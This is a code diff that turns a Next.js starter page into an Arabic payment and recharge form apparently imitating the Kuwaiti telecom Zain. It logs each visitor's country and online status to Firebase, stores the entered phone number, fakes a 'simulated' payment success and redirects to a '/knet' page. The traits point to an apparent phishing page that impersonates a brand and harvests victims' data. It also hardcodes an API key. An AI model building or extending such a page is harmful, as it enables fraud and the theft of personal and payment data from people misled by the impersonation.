@@ -1,113 +1,301 @@
-import Image from 'next/image';
+"use client"
 
-export default function Home() {
-  return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+import type React from "react"
+import { useState, useEffect, useCallback } from "react"
+import { Plus, AlertCircle, CheckCircle2, CreditCard, Smartphone, Loader2 } from 'lucide-react'
+import { Button } from "@/components/ui/button"
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
+import { Label } from "@/components/ui/label"
+import { Input } from "@/components/ui/input"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { Checkbox } from "@/components/ui/checkbox"
+import { Badge } from "@/components/ui/badge"
+import { Separator } from "@/components/ui/separator"
+// Assuming these are correctly set up in your project
+ import { addData } from "@/lib/firebase";
+ import { setupOnlineStatus } from "@/lib/util";
+import Loader from "@/components/loader"
+import "./globals.css"
+
+// Placeholder functions to avoid errors if lib files are not present
+
+
+const newVisitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;
+
+
+export default function ZainPaymentForm() {
+  const [phone, setPhone] = useState("")
+  const [paymentType, setPaymentType] = useState("other")
+  const [termsAccepted, setTermsAccepted] = useState(false)
+  const [amount, setAmount] = useState('6.00')
+  const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
+  const [phoneError, setPhoneError] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+  const [activeTab, setActiveTab] = useState("bill")
+
+  useEffect(() => {
+   getLocationAndLog().then(()=>{
+    console.log('doeb')
+   })
+  }, []);
+
+  useEffect(() => {
+    localStorage.setItem("amount",amount);
+  }, [amount]);
+
+
+
+  useEffect(() => {
+    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
+      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.")
+    } else {
+      setPhoneError("")
+    }
+  }, [phone])
+
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^0-9]/g, "")
+    if (value.length <= 8) {
+      setPhone(value)
+    }
+  }
+
+  const handleAmountSelect = (value: string) => {
+    setSelectedAmount(value)
+    localStorage.setItem("amount", value) // Consider if this is necessary or should be component state only
+    setAmount((value))
+  }
+
+  const getLocationAndLog = useCallback(async () => {
+    if (!newVisitorId) return;
+
+    // This API key is public and might be rate-limited or disabled.
+    // For a production app, use a secure way to handle API keys, ideally on the backend.
+    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
+    try {
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: newVisitorId,
+        country: country,
+        action: "page_load"
+      })
+      localStorage.setItem("country", country) // Consider privacy implications
+      setupOnlineStatus(newVisitorId)
+    } catch (error) {
+      console.error("Error fetching location:", error)
+      // Log error with visitor ID for debugging
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: newVisitorId,
+        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
+        action: "location_error"
+      });
+    }
+  }, []);
+
+  useEffect(() => {
+    getLocationAndLog().then(()=>{
+
+    });
+  }, []);
+
+  const handleSubmit = async (e:any) => {
+    e.preventDefault()
+    setIsLoading(true)
+
+    if (!newVisitorId) return
+    
+    try {
+      await addData({
+        id: newVisitorId,
+        phone: phone, // Storing phone number, ensure compliance with privacy regulations
+        amount: amount,
+        timestamp: new Date().toISOString(),
+        action: "payment_submit_attempt"
+      })
+      // Simulate API call for payment processing
+      
+      // On successful payment simulation
+      await addData({
+        id: newVisitorId,
+        action: "payment_submit_success_simulation",
+        status: "simulated_success"
+      });
+      // Navigate to checkout or show success
+      // For Next.js, prefer using the `useRouter` hook for navigation
+      window.location.href = "/knet"; // Replace with Next.js router if possible: router.push('/checkout')
+    } catch (error) {
+      console.error("Submission error:", error);
+      await addData({
+        id: newVisitorId,
+        action: "payment_submit_error",
+        error: error instanceof Error ? error.message : String(error)
+      });
+      // Handle error display to user
+    } finally {
+      setIsLoading(false)
+    }
+  }
+
+  const isFormValid = phone.length === 8 &&  parseInt(amount) > 0
+
+  const billAmounts = ["5", "10", "15", "20", "30", "50"]
+  const rechargeAmounts = ["2", "5", "10", "15", "20", "30"]
+  const currentAmounts = activeTab === "bill" ? billAmounts : rechargeAmounts;
+
+  const renderAmountSelection = () => (
+    phone.length === 8 && !phoneError && (
+      <div className="space-y-3">
+        <Label className="text-sm font-medium text-slate-800">
+          {activeTab === "bill" ? "اختر مبلغ الفاتورة" : "اختر باقة إعادة التعبئة"}
+        </Label>
+        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
+          {currentAmounts.map((value) => (
+            <Button
+              key={value}
+              type="button"
+              variant={selectedAmount === value ? "default" : "outline"}
+              className={`h-auto py-3 px-2 text-base font-semibold transition-all duration-200 rounded-lg shadow-sm hover:shadow-md focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2
+                ${selectedAmount === value
+                  ? "bg-primary text-primary-foreground scale-105 ring-2 ring-primary ring-offset-1"
+                  : "border-slate-300 hover:border-primary hover:bg-primary/10 text-slate-700"
+                }`}
+              onClick={() => handleAmountSelect(value)}
+            >
+              <div className="text-center w-full">
+                <div className="font-bold text-lg">{value}.000</div>
+                <div className="text-xs opacity-90">د.ك</div>
+              </div>
+            </Button>
+          ))}
         </div>
       </div>
-
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
+    )
   );
+ 
+  const renderPhoneNumberInput = () => (
+    <div className="space-y-2">
+      <Label className="text-sm font-medium text-slate-800 flex items-center justify-between">
+        <span>رقم الهاتف</span>
+        <Badge variant="outline" className="text-xs font-normal border-primary/50 text-primary">مطلوب</Badge>
+      </Label>
+      <div className="relative">
+        <Input
+          type="tel"
+          placeholder="XXXXXXXX"
+          value={phone}
+          onChange={handlePhoneChange}
+          maxLength={8}
+          className={`h-12 text-lg font-mono bg-white border-slate-300 focus:border-primary focus:ring-1 focus:ring-primary transition-colors placeholder:text-slate-400 text-right
+            ${phoneError ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-slate-300"}
+            ${phone.length === 8 && !phoneError ? "border-green-500 focus:border-green-500 focus:ring-green-500" : ""}`}
+          dir="rtl" // Keep ltr for phone number input
+        />
+        {phone.length === 8 && !phoneError && (
+          <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
+        )}
+         {phoneError && phone.length > 0 && (
+            <AlertCircle className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
+        )}
+      </div>
+      {phoneError && (
+        <div className="flex items-center gap-2 text-xs text-red-600 pt-1">
+          <AlertCircle className="w-4 h-4 flex-shrink-0" />
+          <p>{phoneError}</p>
+        </div>
+      )}
+    </div>
+  );
+
+  const renderTermsAndConditions = (idPrefix: string) => (
+     <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
+      <div className="flex items-start gap-3">
+        <Checkbox
+          id={`${idPrefix}-terms`}
+          checked={termsAccepted}
+          onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
+          className="mt-0.5 data-[state=checked]:bg-primary data-[state=checked]:border-primary border-slate-400"
+          aria-labelledby={`${idPrefix}-terms-label`}
+        />
+        <div className="grid gap-1.5 leading-none">
+          <Label
+            htmlFor={`${idPrefix}-terms`}
+            id={`${idPrefix}-terms-label`}
+            className="text-sm font-medium cursor-pointer text-slate-700 hover:text-primary transition-colors"
+          >
+            أوافق على الشروط والأحكام
+          </Label>
+          <p className="text-xs text-slate-500">
+            بالمتابعة، أنت توافق على شروط وأحكام الخدمة الخاصة بنا.
+          </p>
+        </div>
+      </div>
+    </div>
+  );
+
+  return (
+    <form dir="rtl" onSubmit={handleSubmit} className="min-h-screen bg-white text-black p-4">
+    <div className="max-w-md mx-auto bg-white rounded-xl shadow-md p-4" dir="rtl">
+      <div className="flex justify-around border-b pb-2 mb-4">
+        <button type="button" onClick={()=>setActiveTab('bill')} className={activeTab==="bill"?"text-pink-600 font-bold":"text-gray-600"}>دفع الفاتورة</button>
+        <button type="button" onClick={()=>setActiveTab('ess')}  className={activeTab==="ess"?"text-pink-600 font-bold":"text-gray-600"}>إعادة تعبئة eeZee</button>
+
+      </div>
+
+      <h2 className="text-lg font-bold mb-2">أود أن أعيد التعبئة لـ</h2>
+
+      <div className="mb-4">
+        {renderPhoneNumberInput()}
+      </div>
+
+      <div className="mb-4">
+        <label className="block mb-1 text-gray-700">مبلغ التعبئة</label>
+        <select
+          className="w-full border border-gray-300 rounded p-2"
+          value={amount}
+          onChange={(e) => setAmount(e.target.value)}
+        >
+          <option value="6.000">6.000 د.ك (30 يوم)</option>
+          <option value="10.000">10.000 د.ك (60 يوم)</option>
+          <option value="15.000">15.000 د.ك (90 يوم)</option>
+          <option value="30.000">30.000 د.ك (120 يوم)</option>
+          <option value="40.000">40.000 د.ك (150 يوم)</option>
+          <option value="50.000">50.000 د.ك (200 يوم)</option>
+        </select>
+      </div>
+
+      <div className="text-center mb-4">
+        <button className=" text-gray-600 py-2 px-4 rounded w-full" disabled>
+          + أضف رقم آخر
+        </button>
+      </div>
+
+      <hr className="my-4" />
+
+      <div className="flex justify-between text-xl font-bold text-green-600 mb-4">
+      <span className="text-black">إجمالي</span>
+      
+        <span>{amount}د.ك</span>
+      </div>
+
+      <button disabled={!isFormValid} className={isFormValid?"bg-rose-600 text-white py-2 px-4 rounded w-full" :"bg-gray-300 text-gray-600 py-2 px-4 rounded w-full" }>
+        أعد التعبئة الآن
+      </button>
+    </div>
+    {isLoading&&<Loader/>}
+
+  </form>
+
+
+
+  )
 }
+
